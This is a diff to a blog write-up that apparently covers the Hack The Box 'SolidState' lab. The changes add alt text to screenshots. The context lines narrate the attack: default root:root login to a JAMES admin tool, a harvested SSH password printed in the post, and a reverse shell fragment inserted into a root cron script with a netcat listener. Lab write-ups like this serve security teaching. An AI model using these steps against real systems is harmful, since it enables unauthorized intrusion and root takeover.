@@ -38,7 +38,7 @@ Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Trying a `telnet solidstate.htb 4555`, as 4555 is the oddest port:
 
-{{<img "james.png" >}}
+{{<img "james.png" "JAMES remote administration login showing a successful root session" >}}
 
 James Administration Tool has default passwords `root`:`root` and it let us in (here the importance of changing default passwords).
 
@@ -106,17 +106,17 @@ Nothing on James nor Thomas.
 
 On John:
 
-{{<img "john.png" >}}
+{{<img "john.png" "POP3 session listing and retrieving a message from the john mailbox" >}}
 
 It says Mindy has a temporary password, let's investigate his emails.
 
 Mindy's 1º email:
 
-{{<img "1email.png" >}}
+{{<img "1email.png" "Email welcoming a new junior defense analyst to the Solid State Security team" >}}
 
 Mindy's 2º email:
 
-{{<img "2email.png" >}}
+{{<img "2email.png" "Email containing Mindy's SSH username and temporary password" >}}
 
 So we got credentials:
 
@@ -127,7 +127,7 @@ pass: P@55W0rd1!2@
 
 Et voilá!
 
-{{<img "ssh.png" >}}
+{{<img "ssh.png" "Successful SSH login to the Solidstate host as Mindy" >}}
 
 ## Privilege Escalation
 
@@ -143,11 +143,11 @@ And then the [TTY procedure](https://pablogonzalez.me/posts/pentest-cheatsheet/#
 
 I [uploaded](/posts/data_exfiltration) `linenum` but didn't find anything interesting, so I continued and uploaded `pspy` to check crons and this appears:
 
-{{<img "crons.png" >}}
+{{<img "crons.png" "Process listing showing recurring Python and shell cron jobs" >}}
 
 So `root` is running a python script and I have full access to the file:
 
-{{<img "tmp.png" >}}
+{{<img "tmp.png" "File listing showing the writable tmp.py script in /opt" >}}
 
 So the idea is to put a reverse shell inside the script and when the cron runs again, we'll have a connection.
 
@@ -166,4 +166,4 @@ p = subprocess.call(["/bin/sh","-i"])
 
 Listening with `nc -lnvp 4444` and... got `root` access!
 
-{{<img "root.png" >}}
+{{<img "root.png" "Netcat reverse shell with an id command confirming root privileges" >}}
